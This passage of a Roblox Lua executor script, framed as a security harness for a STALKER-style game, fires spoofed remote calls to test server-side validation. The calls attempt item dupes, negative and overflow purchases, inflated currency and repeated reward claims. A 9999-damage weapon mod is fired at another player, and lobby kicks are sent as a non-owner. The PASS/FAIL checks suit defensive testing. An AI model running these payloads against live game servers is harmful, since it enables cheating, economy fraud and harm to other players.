        if string.find(string.lower(v.ID), "rouble") or string.find(string.lower(v.ID), "currenc") or string.find(string.lower(v.ID), "money") then found = true end
    end
    log("INFO", string.format("bal %s -> %s currencyPickup=%s", tostring(b0), tostring(CTX.balance), tostring(found)))
    if CTX.balance < 0 or found then return "FAIL", "unfunded drop created money/pickup!" end
    return "PASS", "unfunded rejected"
end)

addTest("CRITICAL", "C3c", "DropRoubles(1) control + re-pickup", "caution", function()
    refreshBalance(); local b0 = CTX.balance
    fireEv("DropRoubles", 1)
    task.wait(1); refreshBalance(); refreshVicinity()
    for _, v in ipairs(CTX.vicItems) do
        fireEv("PickupCurrency", v.tied, v.index)
    end
    task.wait(1); refreshBalance()
    return "INFO", string.format("bal %s -> %s (should end equal if honest)", tostring(b0), tostring(CTX.balance))
end)

addHeader("CRITICAL", "C7 - FALL DAMAGE (self-reported number)")
addTest("CRITICAL", "C7a", "FallDamage(99999) on SELF (may kill you)", "caution", function()
    local b, err = bridge("FallDamage")
    if not b then return "INFO", "no FallDamage bridge: " .. short(err) end
    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local h0 = hum and hum.Health or -1
    local ok, ferr = pcall(function() b:Fire(99999) end)
    task.wait(0.75)
    hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local h1 = hum and hum.Health or -1
    log("INFO", string.format("health %s -> %s", tostring(h0), tostring(h1)))
    if h1 < h0 then return "FAIL", "server applied CLIENT-CHOSEN damage (and deleting the script = immunity)" end
    return "PASS", "server ignored spoofed fall damage"
end)
addNote("CRITICAL", "Manual: delete/disable FallDamage LocalScript, jump off something tall. No damage = vulnerable.")

-- ============================ DUPES ========================================
addHeader("DUPES", "H1 - INVENTORY RACE DUPES (use JUNK item!)")

addTest("DUPES", "D3a", "UseItem x25 SAME FRAME (multi-use?)", "caution", function()
    local e = selInv()
    if not e then return "INFO", "select item first" end
    local id = e.ID
    refreshInventory()
    local before = countItem(id)
    for _ = 1, 25 do fireEv("UseItem", e.index, e.tied) end
    task.wait(1.5); refreshInventory()
    local after = countItem(id)
    log("INFO", string.format("%s count %d -> %d (consumed %d, want 1)", id, before, after, before - after))
    if before - after <= 0 then return "INFO", "nothing consumed - item may not be usable / already gone" end
    if before - after == 1 then return "PASS", "exactly 1 consumed" end
    return "FAIL", "consumed " .. (before - after) .. "x but FIRED 25 uses - multi-use dupe!"
end)

addTest("DUPES", "D3b", "UseItemByType x10 (hotbar path)", "caution", function()
    local e = selInv()
    if not e then return "INFO", "select item first" end
    refreshInventory()
    local before = countItem(e.ID)
    for _ = 1, 10 do fireEv("UseItemByType", e.ID) end
    task.wait(1.5); refreshInventory()
    local after = countItem(e.ID)
    log("INFO", string.format("%s count %d -> %d", e.ID, before, after))
    return "INFO", "consumed " .. (before - after) .. " for 10 fires (want <=1 effect)"
end)

addTest("DUPES", "D4", "Double-MOVE same index to 2 grids", "caution", function()
    local e = selInv()
    if not e then return "INFO", "select item first" end
    local dests = {}
    for _, t in ipairs(CTX.tiedList) do
        if t ~= e.tied then table.insert(dests, t) end
    end
    if #dests < 2 then
        -- fall back: same-grid reposition race via MoveItem
        log("INFO", "only 1 grid known - racing MoveItem reposition instead")
        local r1, r2
        task.spawn(function() r1 = {callFn(Remotes, "MoveItem", e.index, e.tied, Vector2.new(0,0), 0)} end)
        task.spawn(function() r2 = {callFn(Remotes, "MoveItem", e.index, e.tied, Vector2.new(2,2), 0)} end)
        task.wait(1.5)
        log("INFO", "r1=" .. dump(r1) .. " r2=" .. dump(r2))
        refreshInventory()
        return "INFO", "both-accepted + item duplicated = FAIL (check counts)"
    end
    local r1, r2
    task.spawn(function() r1 = {callFn(Remotes, "MoveItemAcrossItemManager", e.index, e.tied, dests[1], Vector2.new(0,0), 0)} end)
    task.spawn(function() r2 = {callFn(Remotes, "MoveItemAcrossItemManager", e.index, e.tied, dests[2], Vector2.new(0,0), 0)} end)
    task.wait(1.5)
    log("INFO", "to " .. tostring(dests[1]) .. " -> " .. dump(r1))
    log("INFO", "to " .. tostring(dests[2]) .. " -> " .. dump(r2))
    refreshInventory()
    local n = countItem(e.ID)
    if n > 1 then return "FAIL", "item now exists " .. n .. "x - DUPE CONFIRMED" end
    return "INFO", "count=" .. n .. ". Exactly one r should be true."
end)

addTest("DUPES", "D1", "DropItem + TraderConfirmSell RACE", "caution", function()
    local e, npc = selInv(), selNPC()
    if not e then return "INFO", "select item first" end
    if not npc then return "INFO", "select trader NPC first" end
    local entry = {itemID = e.ID, qty = 1, sourceInv = e.tied, position = nil, itemIndex = e.index}
    local r1
    task.spawn(function() fireEv("DropItem", e.index, e.tied, e.ID) end)
    task.spawn(function() r1 = {callFn(Remotes, "TraderConfirmSell", npc, {entry})} end)
    task.wait(1.5)
    log("INFO", "sell -> " .. dump(r1))
    refreshInventory(); refreshVicinity()
    local inInv = countItem(e.ID) > 0
    local inVic = false
    for _, v in ipairs(CTX.vicItems) do if v.ID == e.ID then inVic = true end end
    log("INFO", "inInv=" .. tostring(inInv) .. " inVic=" .. tostring(inVic))
    if inInv and inVic then return "FAIL", "item BOTH kept/sold AND dropped - dupe!" end
    return "INFO", "want exactly one of (sold, dropped, kept)"
end)

addTest("DUPES", "D7", "TraderConfirmSell SAME entry x5 (multi-pay?)", "caution", function()
    local e, npc = selInv(), selNPC()
    if not e then return "INFO", "select item first" end
    if not npc then return "INFO", "select trader NPC first" end
    refreshBalance(); local b0 = CTX.balance
    local entry = {itemID = e.ID, qty = 1, sourceInv = e.tied, position = nil, itemIndex = e.index}
    local ok, res = callFn(Remotes, "TraderConfirmSell", npc, {entry, entry, entry, entry, entry})
    task.wait(1); refreshBalance(); refreshInventory()
    log("INFO", "sell x5 same -> ok=" .. tostring(ok) .. " res=" .. dump(res, 1))
    log("INFO", string.format("bal %s -> %s, left=%d", tostring(b0), tostring(CTX.balance), countItem(e.ID)))
    if ok and type(res) == "table" and (res.sold or 0) > 1 then
        return "FAIL", "paid " .. tostring(res.sold) .. "x for ONE item!"
    end
    return "PASS", "paid at most once"
end)

addTest("DUPES", "D6", "QuickTake / Take RACE (vicinity item)", "caution", function()
    local v = selVic()
    if not v then return "INFO", "need vicinity item (drop junk, refresh)" end
    local r1, r2
    task.spawn(function() r1 = {callFn(Remotes, "QuickTakeItem", v.tied, v.index)} end)
    task.spawn(function() r2 = {callFn(Remotes, "QuickTakeItem", v.tied, v.index)} end)
    task.wait(1.5)
    log("INFO", "take1=" .. dump(r1) .. " take2=" .. dump(r2))
    refreshInventory()
    local n = countItem(v.ID)
    return "INFO", "received " .. n .. "x (want 1). If 2 visible and both true = FAIL"
end)

addTest("DUPES", "D5", "RepackMagazine x2 CONCURRENT (ammo create?)", "caution", function()
    local e = selInv()
    if not e then return "INFO", "select ammo/mag item first" end
    fireEv("RepackMagazine", e.index, e.tied, e.index, e.tied)
    fireEv("RepackMagazine", e.index, e.tied, e.index, e.tied)
    task.wait(1.5); refreshInventory()
    return "INFO", "fired same repack 2x concurrently - inspect ammo counts for creation"
end)

addTest("DUPES", "D9", "BarterContribute + MOVE race", "caution", function()
    local e = selInv()
    if not e then return "INFO", "select item first" end
    local dest = nil
    for _, t in ipairs(CTX.tiedList) do if t ~= e.tied then dest = t; break end end
    local r1
    task.spawn(function() r1 = {callFn(Remotes, "BarterContributeItem", e.tied, e.index, "TEST")} end)
    if dest then
        task.spawn(function() callFn(Remotes, "MoveItemAcrossItemManager", e.index, e.tied, dest, Vector2.new(0,0), 0) end)
    else
        task.spawn(function() fireEv("DropItem", e.index, e.tied, e.ID) end)
    end
    task.wait(1.5)
    log("INFO", "contribute -> " .. dump(r1))
    refreshInventory()
    return "INFO", "if contribute ok AND item still in inv/dropped = dupe"
end)

-- ============================ ECONOMY ======================================
addHeader("ECONOMY", "H2 - BUY (qty is client-controlled)")
addNote("ECONOMY", "Uses selected TRADER + SPOOF ID as the item to buy. DANGER = spends money.")

local function buyTest(qty)
    local npc, id = selNPC(), selItemID()
    if not npc then return "INFO", "select trader NPC" end
    if not id then return "INFO", "no item DB" end
    refreshBalance(); local b0 = CTX.balance
    local ok, res = callFn(Remotes, "BuyBulk", npc, {{itemID = id, qty = qty}})
    task.wait(1); refreshBalance(); refreshInventory()
    log("INFO", string.format("buy %s x%s -> ok=%s res=%s bal %s->%s got=%d",
        id, tostring(qty), tostring(ok), dump(res, 1), tostring(b0), tostring(CTX.balance), countItem(id)))
    return ok, res
end

addTest("ECONOMY", "H2a", "BuyBulk qty=-1", "danger", function()
    local ok, res = buyTest(-1)
    if ok and type(res) == "table" and (res.bought or 0) > 0 then return "FAIL", "negative qty bought!" end
    return "PASS", "rejected"
end)
addTest("ECONOMY", "H2b", "BuyBulk qty=0", "danger", function()
    local ok, res = buyTest(0)
    if ok and type(res) == "table" and (res.bought or 0) > 0 then return "FAIL", "zero qty bought!" end
    return "PASS", "rejected"
end)
addTest("ECONOMY", "H2c", "BuyBulk qty=2147483647 (overflow)", "danger", function()
    local ok, res = buyTest(2147483647)
    if ok and type(res) == "table" and (res.bought or 0) > 0 then return "FAIL", "huge qty bought - check price math!" end
    return "PASS", "rejected"
end)
addTest("ECONOMY", "H2d", "BuyBulk qty=99999 (over funds)", "danger", function()
    local ok, res = buyTest(99999)
    if ok and type(res) == "table" and (res.bought or 0) > 0 then return "FAIL", "bought without funds!" end
    return "PASS", "rejected"
end)

addHeader("ECONOMY", "H3 - BARTER (currency amount from client)")
addTest("ECONOMY", "H3a", "BarterAutoFillPreview (read)", "safe", function()
    local ok, res = callFn(Remotes, "BarterAutoFillPreview")
    log("INFO", "preview -> ok=" .. tostring(ok) .. " " .. dump(res, 2))
    return "INFO", "inspect shape for H3b"
end)
local barterID = addInput("ECONOMY", "Currency id", "Rouble")
local barterAmt = addInput("ECONOMY", "Amount", "999999")
addTest("ECONOMY", "H3b", "BarterAutoFillCommit MANUAL inflated", "danger", function()
    refreshBalance(); local b0 = CTX.balance
    local t = {items = {}, currency = {{itemId = barterID.Text, amount = tonumber(barterAmt.Text) or 0}}}
    local ok, res = callFn(Remotes, "BarterAutoFillCommit", t)
    task.wait(1); refreshBalance()
    log("INFO", "commit -> ok=" .. tostring(ok) .. " res=" .. dump(res, 1) .. string.format(" bal %s->%s", tostring(b0), tostring(CTX.balance)))
    if ok and type(res) == "table" and res.ok then
        return "INFO", "accepted - verify debit == progress (check stash size vs balance)"
    end
    return "PASS", "rejected"
end)

addHeader("ECONOMY", "H4/H5 - KITS & CLAIMS (idempotency)")
addTest("ECONOMY", "H4", "TutorialAcceptIntro x5 (free kits?)", "caution", function()
    refreshInventory(); local b0 = #CTX.invItems
    for i = 1, 5 do fireEv("TutorialAcceptIntro", "test" .. i); task.wait(0.15) end
    task.wait(1.5); refreshInventory()
    local gained = #CTX.invItems - b0
    log("INFO", "items " .. b0 .. " -> " .. #CTX.invItems .. " (+" .. gained .. ")")
    if gained > 8 then return "FAIL", "MULTIPLE kits granted (" .. gained .. " items)!" end
    if gained > 0 then return "INFO", "one kit granted (first-time?) - run again, want +0" end
    return "PASS", "no kit (already claimed or rejected)"
end)

addTest("ECONOMY", "H5a", "DailyLoginClaim x2 CONCURRENT", "caution", function()
    local r1, r2
    task.spawn(function() r1 = {callFn(Remotes, "DailyLoginClaim")} end)
    task.spawn(function() r2 = {callFn(Remotes, "DailyLoginClaim")} end)
    task.wait(1.5)
    log("INFO", "c1=" .. dump(r1) .. " c2=" .. dump(r2))
    return "INFO", "both ok=true with rewards = FAIL (double pay)"
end)

addTest("ECONOMY", "H5b", "CollectPendingRewards x2 CONCURRENT", "caution", function()
    local r1, r2
    task.spawn(function() r1 = {callFn(Remotes, "CollectPendingRewards")} end)
    task.spawn(function() r2 = {callFn(Remotes, "CollectPendingRewards")} end)
    task.wait(1.5)
    log("INFO", "c1=" .. dump(r1) .. " c2=" .. dump(r2))
    return "INFO", "both ok=true with rewards = FAIL (double pay)"
end)

addTest("ECONOMY", "H5c", "MainTaskTurnIn x2 CONCURRENT", "caution", function()
    local r1, r2
    task.spawn(function() r1 = {callFn(Remotes, "MainTaskTurnIn")} end)
    task.spawn(function() r2 = {callFn(Remotes, "MainTaskTurnIn")} end)
    task.wait(1.5)
    log("INFO", "c1=" .. dump(r1) .. " c2=" .. dump(r2))
    return "INFO", "both rewarded = FAIL"
end)

local taskInput = addInput("ECONOMY", "Task/quest id", "")
addTest("ECONOMY", "H5d", "HandinTask(taskId) x2 (need id)", "caution", function()
    if not TaskRemotes then return "INFO", "no TaskRemotes" end
    if taskInput.Text == "" then return "INFO", "enter a completed task id first" end
    local r1 = {callFn(TaskRemotes, "HandinTask", taskInput.Text, "TestNPC")}
    task.wait(0.5)
    local r2 = {callFn(TaskRemotes, "HandinTask", taskInput.Text, "TestNPC")}
    log("INFO", "h1=" .. dump(r1) .. " h2=" .. dump(r2))
    return "INFO", "both ok = FAIL"
end)

addHeader("ECONOMY", "MAGS / SKINS / FACTION")
addTest("ECONOMY", "E1", "LoadWeaponMag x5 spam (one mag fills 5x?)", "caution", function()
    for _ = 1, 5 do fireEv("LoadWeaponMag", "Primary") end
    task.wait(1.5)
    local gun = findGun()
    if gun then
        local ammo = gun:FindFirstChild("Ammo")
        local mag = ammo and ammo:FindFirstChild("MagAmmo")
        log("INFO", "MagAmmo=" .. (mag and (mag.Value .. "/" .. mag.MaxValue) or "?"))
    end
    refreshInventory()
    return "INFO", "compare mag count vs fills - mag consumed exactly once = good"
end)

local skinType = addInput("ECONOMY", "Skin itemType", "AKM")
local skinID = addInput("ECONOMY", "Skin id", "TEST_SKIN")
addTest("ECONOMY", "E2", "ApplySkin UNOWNED (paid skin free?)", "caution", function()
    local ok0, owned0 = callFn(Remotes, "GetUnlockedSkins")
    log("INFO", "owned before: " .. dump(owned0, 1))
    fireEv("ApplySkin", skinType.Text, skinID.Text)
    task.wait(1)
    local ok1, owned1 = callFn(Remotes, "GetUnlockedSkins")
    log("INFO", "owned after: " .. dump(owned1, 1))
    return "INFO", "check gun appearance - skin applied without ownership = FAIL"
end)

addTest("ECONOMY", "E3", "SubmitVeteranFactionPick (ONE-TIME!)", "danger", function()
    local key = CTX.factions[CTX.factionSel]
    fireEv("SubmitVeteranFactionPick", key)
    task.wait(1.5); refreshInventory()
    return "INFO", "fired " .. key .. " - non-veteran receiving pack = FAIL"
end)

-- ============================ COMBAT =======================================
addHeader("COMBAT", "C4 - GUN TRUST (needs consenting ALT victim!)")
addNote("COMBAT", "DANGER tests damage the TARGET player. Use your own alt, private server.")

addTest("COMBAT", "G0", "Inspect equipped gun + ammo", "safe", function()
    local gun = findGun()
    if not gun then return "INFO", "equip a gun first" end
    local ammo = gun:FindFirstChild("Ammo")
    local mag = ammo and ammo:FindFirstChild("MagAmmo")
    local res = ammo and ammo:FindFirstChild("ReserveAmmo")
    log("INFO", "gun=" .. gun:GetFullName())
    log("INFO", "Mag=" .. (mag and (mag.Value .. "/" .. mag.MaxValue) or "?") ..
        " Reserve=" .. (res and tostring(res.Value) or "?"))
    return "INFO", "done"
end)

local evilMod = {
    damage = {Head = 9999, Torso = 9999, Other = 9999},
    fireRate = 0.01, muzzleVelocity = 99999,
    armorPenMultiplier = 9999, ammoType = "AP",
    spread = 0, shotgunPellets = 10,
}

addTest("COMBAT", "C4a", "BulletHit victim HEAD (LOS/range test)", "danger", function()
    local gun = findGun()
    if not gun then return "INFO", "equip a gun first" end
    local head, p = victimHead()
    if not head then return "INFO", "need target player with character" end
    if p == LocalPlayer then return "INFO", "pick your ALT as target, not yourself" end
    local b, err = bridge("BulletHit")
    if not b then return "INFO", "no BulletHit bridge: " .. short(err) end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local h0 = hum.Health
    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - head.Position).Magnitude
    log("INFO", string.format("victim=%s hp=%s dist=%.1f (stand FAR / behind WALL)", p.Name, tostring(h0), dist))
    pcall(function()
        b:Fire(gun, {Position = head.Position, Normal = Vector3.yAxis, Instance = head},
            CFrame.new(head.Position), evilMod)
    end)
    task.wait(1)
    local h1 = hum.Health
    log("INFO", string.format("hp %s -> %s (dmg=%s)", tostring(h0), tostring(h1), tostring(h0 - h1)))
    if h1 >= h0 then return "PASS", "no damage through wall/distance (or already dead)" end
    if h0 - h1 > 500 then return "FAIL", "MASSIVE damage - server trusts client ModTable damage!" end
    return "FAIL", "damaged through wall/distance - missing LOS/range check (dmg=" .. (h0-h1) .. ")"
end)

addTest("COMBAT", "C4b", "BulletHit x30 BURST (rate-limit test)", "danger", function()
    local gun = findGun()
    if not gun then return "INFO", "equip a gun first" end
    local head, p = victimHead()
    if not head or p == LocalPlayer then return "INFO", "need ALT target" end
    local b = bridge("BulletHit")
    if not b then return "INFO", "no bridge" end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local h0 = hum.Health
    for _ = 1, 30 do
        pcall(function()
            b:Fire(gun, {Position = head.Position, Normal = Vector3.yAxis, Instance = head},
                CFrame.new(head.Position), {damage = {Head = 1, Torso = 1, Other = 1}})
        end)
    end
    task.wait(1.5)
    local h1 = hum.Health
    log("INFO", string.format("30 hits -> hp %s -> %s (dmg=%s)", tostring(h0), tostring(h1), tostring(h0-h1)))
    if h0 - h1 <= 0 then return "PASS", "burst did nothing (rate/dead)" end
    return "INFO", "dmg=" .. (h0-h1) .. " - if this equals ~30x single-hit dmg, NO rate limit (FAIL)"
end)

addTest("COMBAT", "C4c", "PlayerFire 10x no reload (ammo honesty)", "caution", function()
    local gun = findGun()
    if not gun then return "INFO", "equip a gun first" end
    local b = bridge("PlayerFire")
    if not b then return "INFO", "no PlayerFire bridge" end
    local ammo = gun:FindFirstChild("Ammo")
    local mag = ammo and ammo:FindFirstChild("MagAmmo")
    local m0 = mag and mag.Value or -1
    local cf = LocalPlayer.Character.HumanoidRootPart.CFrame
    for _ = 1, 10 do pcall(function() b:Fire(cf, {}) end) end
    task.wait(1.5)
    local m1 = mag and mag.Value or -1
    log("INFO", string.format("MagAmmo %s -> %s after 10 forced fires", tostring(m0), tostring(m1)))
    if m0 - m1 >= 10 then return "PASS", "server decremented per shot" end
    return "INFO", "decremented " .. (m0-m1) .. "/10 - investigate"
end)

addHeader("COMBAT", "C5 - MELEE TRUST")
addTest("COMBAT", "C5a", "Melee hit victim from RANGE", "danger", function()
    local tool = findMelee()
    if not tool then return "INFO", "equip/hold a MELEE weapon first" end
    local head, p = victimHead()
    if not head or p == LocalPlayer then return "INFO", "need ALT target" end
    local hum = p.Character:FindFirstChildOfClass("Humanoid")
    local h0 = hum.Health
    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - head.Position).Magnitude
    log("INFO", string.format("victim=%s hp=%s dist=%.1f (stand FAR away)", p.Name, tostring(h0), dist))
    pcall(function()
        tool.Remotes.RemoteEventMelee:FireServer(head, head.Position, Vector3.yAxis)
    end)
    task.wait(1)
    local h1 = hum.Health
    log("INFO", string.format("hp %s -> %s", tostring(h0), tostring(h1)))
    if h1 < h0 then return "FAIL", "melee damaged from " .. string.format("%.1f", dist) .. "m - no range/LOS check!" end
    return "PASS", "rejected at range"
end)

addTest("COMBAT", "C5b", "ConnectM6D with RANDOM part (ownership?)", "caution", function()
    local mreps = ReplicatedStorage:FindFirstChild("MeleeSystemReplicated")
    local conn = mreps and mreps:FindFirstChild("ConnectM6D")
    if not conn then return "INFO", "no ConnectM6D" end
    local rock = workspace:FindFirstChildOfClass("Part")
    pcall(function() conn:FireServer(rock) end)
    task.wait(0.5)
    pcall(function()
        local disc = mreps:FindFirstChild("DisconnectM6D")
        if disc then disc:FireServer(rock) end
    end)
    return "INFO", "fired with arena part - check main/server log for weld; weld of foreign part = FAIL"
end)

addHeader("COMBAT", "H6 - STAMINA FLAG")
addTest("COMBAT", "H6", "SprintState(true) while STANDING (10s)", "safe", function()
    log("INFO", "spoofing sprint=true while stationary - watch YOUR stamina bar")
    local conn = Remotes:FindFirstChild("StaminaSync")
    local drained = false
    local c
    if conn then
        c = conn.OnClientEvent:Connect(function(a, _b)
            if type(a) == "number" and a < 0.99 then drained = true end
        end)
    end
    for _ = 1, 20 do fireEv("SprintState", true); task.wait(0.5) end
    fireEv("SprintState", false)
    if c then c:Disconnect() end
    if drained then return "FAIL", "stamina DRAINED while standing still - server trusts the flag (=> never sending it = infinite stamina)" end
    return "PASS", "no drain while stationary (server derives sprint itself)"
end)

addHeader("COMBAT", "M1 - WEAPON STATE BRIDGES")
addTest("COMBAT", "M1a", "PlayerDropGun() x3 (dupe/drop?)", "caution", function()
    local b = bridge("PlayerDropGun")
    if not b then return "INFO", "no PlayerDropGun bridge" end
    refreshInventory(); local b0 = #CTX.invItems
    for _ = 1, 3 do pcall(function() b:Fire() end); task.wait(0.3) end
    task.wait(1); refreshInventory(); refreshVicinity()
    log("INFO", string.format("inv %d -> %d, vic=%d", b0, #CTX.invItems, #CTX.vicItems))
    return "INFO", "gun dropped 0/1/3x? 3 drops from 1 gun = dupe"
end)

addTest("COMBAT", "M1b", "SwitchWeapon(gun) + Reload(evil mod)", "caution", function()
    local gun = findGun()
    if not gun then return "INFO", "equip a gun first" end
    local sw = bridge("SwitchWeapon")
    local rl = bridge("Reload")
    if sw then pcall(function() sw:Fire(gun) end) end
    if rl then pcall(function() rl:Fire(evilMod) end) end
    task.wait(1)
    return "INFO", "fired with tampered mod - watch for errors/odd behavior on main"
end)

-- ============================ MISC =========================================
addHeader("MISC", "RESPAWN / LOBBY / MISC")
addTest("MISC", "X1", "RequestRespawn (use while DEAD)", "safe", function()
    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local dead = (not hum) or hum.Health <= 0
    log("INFO", "currently dead=" .. tostring(dead) .. " - firing immediately")
    fireEv("RequestRespawn")
    task.wait(2)
    local hum2 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local alive = hum2 and hum2.Health > 0
    if dead and alive then return "FAIL", "instant respawn accepted - no server timer!" end
    return "INFO", dead and "still dead (timer ok) - re-fire after countdown" or "you are alive; die first, then run instantly"
end)

addTest("MISC", "X2", "Lobby_Start as NON-OWNER", "caution", function()
    fireEv("Lobby_Start")
    task.wait(1)
    return "INFO", "if the lobby started / map changed and you are not owner = FAIL"
end)

local kickTarget = addInput("MISC", "Kick target", "")
addTest("MISC", "X3", "Lobby_Kick(target) as non-owner", "caution", function()
    local t = kickTarget.Text ~= "" and kickTarget.Text or LocalPlayer.Name
    fireEv("Lobby_Kick", t)
    task.wait(1)
    return "INFO", "fired kick " .. t .. " - effect without ownership = FAIL"
end)

local voiceKey = addInput("MISC", "Voiceline key", "Goodbye")
addTest("MISC", "X4", "PlayVoiceline arbitrary key x5", "caution", function()
    local npc = selNPC()
    for _ = 1, 5 do fireEv("PlayVoiceline", npc, voiceKey.Text); task.wait(0.2) end
    return "INFO", "no throttle/whitelist = spam + unmoderated audio risk"
end)

addTest("MISC", "X5", "CinematicRequestEnter/Exit", "safe", function()
    local ok, res = callFn(Remotes, "CinematicRequestEnter")
    log("INFO", "enter -> ok=" .. tostring(ok) .. " res=" .. dump(res, 1))
    task.wait(2)
    fireEv("CinematicRequestExit")
    return "INFO", "entered=" .. tostring(ok) .. " - verify no free-cam/teleport powers for non-staff"
end)

local chatMsg = addInput("MISC", "Chat text", "hello zone")
addTest("MISC", "X6", "FilterSelfChat (bubble/spam?)", "safe", function()
    local ok, res = callFn(Remotes, "FilterSelfChat", chatMsg.Text)
    log("INFO", "filter -> ok=" .. tostring(ok) .. " res=" .. dump(res, 1))
    return "INFO", "done"
end)

addHeader("MISC", "M11 - DEAD REMOTE FUZZER")
addTest("MISC", "F1", "Fuzz caller-less remotes with garbage", "safe", function()
    local names = {"BuyItem", "SellItem", "SellBulk", "BarterAutoFill", "PickupItem",
        "PickupVicinityItem", "PickupToInventory", "QuickMove", "InvokeNpcService",
        "ForceDropWeapon", "EquipAnimEvent", "BleedTick", "SquadCallout",
        "MainTaskMessage", "SaveQuickSlots", "HotbarEquipChanged"}
    local garbage = {-1, 0, 999999999, "TEST", {}, {1, 2, 3}, true, math.huge}
    for _, n in ipairs(names) do
        local r = Remotes:FindFirstChild(n)
        if not r then
            log("INFO", n .. ": absent")
        elseif r:IsA("RemoteEvent") then
            local errs = 0
            for _, g in ipairs(garbage) do
                local ok = pcall(function() r:FireServer(g, g, g) end)
                if not ok then errs = errs + 1 end
            end
            log("INFO", n .. " (Event): fired 8 garbage payloads, client-errors=" .. errs)
        elseif r:IsA("RemoteFunction") then
            for _, g in ipairs(garbage) do
                local ok, res = pcall(function() return r:InvokeServer(g, g) end)
                if ok and res ~= nil then
                    log("INFO", n .. " (Function): responded to garbage " .. short(g) .. " -> " .. dump(res, 1))
                    break
                end
            end
        end
        task.wait(0.1)
    end
    return "INFO", "any positive response to garbage = investigate (see log)"
end)

addHeader("MISC", "M12 - READ SCOPE / INFO LEAK")
addTest("MISC", "L1", "GetAllInventories foreign-data check", "safe", function()
    local ok, res = callFn(Remotes, "GetAllInventories")
    if not ok then return "INFO", "call failed" end
    local s = dump(res, 2)
    log("INFO", "keys: " .. s)
    local mine = tostring(LocalPlayer.UserId)
    local leaked = false
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and string.find(s, p.Name, 1, true) then
            leaked = true
            log("WARN", "LEAK? found " .. p.Name .. " in GetAllInventories!")
        end
    end
    if leaked then return "FAIL", "other players' data in YOUR inventory payload" end
    return "PASS", "no foreign names in payload sample"
end)

addTest("MISC", "L2", "Place / server info", "safe", function()
    log("INFO", "PlaceId=" .. tostring(game.PlaceId) .. " JobId=" .. tostring(game.JobId))
    local pc = ReplicatedStorage:FindFirstChild("PlaceConfig")
    if pc then
        local ok, mod = pcall(require, pc)
        if ok and type(mod) == "table" then
            log("INFO", "PlaceConfig: " .. dump(mod, 2))
        end
    end
    return "INFO", "done"
end)

-- ============================ LOG ==========================================
testCounter = testCounter + 1
LogBox = mk("TextBox", {Size = UDim2.new(1, -16, 1, -52), Position = UDim2.fromOffset(8, 8),
    BackgroundColor3 = Color3.fromRGB(8, 9, 12), Text = "", Font = Enum.Font.Code,
    TextSize = 12, TextColor3 = TXT, TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top, MultiLine = true, ClearTextOnFocus = false,
    TextEditable = false, BorderSizePixel = 0, LayoutOrder = testCounter}, contentFrames["LOG"])
mk("UICorner", {CornerRadius = UDim.new(0, 4)}, LogBox)

local logBtnRow = mk("Frame", {Size = UDim2.new(1, -16, 0, 32), Position = UDim2.new(0, 8, 1, -40),
    BackgroundTransparency = 1}, contentFrames["LOG"])
local clearBtn = mk("TextButton", {Size = UDim2.new(0.5, -4, 1, 0), BackgroundColor3 = ROW,
    Text = "CLEAR", Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = TXT,
    BorderSizePixel = 0}, logBtnRow)
mk("UICorner", {CornerRadius = UDim.new(0, 4)}, clearBtn)
local copyBtn = mk("TextButton", {Size = UDim2.new(0.5, -4, 1, 0), Position = UDim2.new(0.5, 4, 0, 0),
    BackgroundColor3 = ROW, Text = "COPY LOG", Font = Enum.Font.GothamBold,
    TextSize = 12, TextColor3 = TXT, BorderSizePixel = 0}, logBtnRow)
mk("UICorner", {CornerRadius = UDim.new(0, 4)}, copyBtn)
clearBtn.MouseButton1Click:Connect(function()
    LogLines = {}
    if LogBox then LogBox.Text = "" end
end)
copyBtn.MouseButton1Click:Connect(function()
    local clip = (getgenv and getgenv().setclipboard) or setclipboard
    if type(clip) == "function" then
        clip(table.concat(LogLines, "\n"))
        log("INFO", "log copied to clipboard")
    else
        log("WARN", "setclipboard unavailable in this executor")
    end
end)

--// Init -------------------------------------------------------------------
showTab("SETUP")
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        main.Visible = not main.Visible
    end
end)

log("INFO", "STALKER security harness loaded. Safe mode ON. Run on NON-ADMIN alt!")
log("INFO", "Step 1: SETUP tab -> S0 Refresh. Step 2: pick junk item + trader + alt victim.")
log("WARN", "DANGER (red) tests are blocked until you toggle SAFE MODE off.")
task.spawn(function()
    task.wait(1)
    pcall(refreshBalance)
    pcall(refreshPlayers)
end)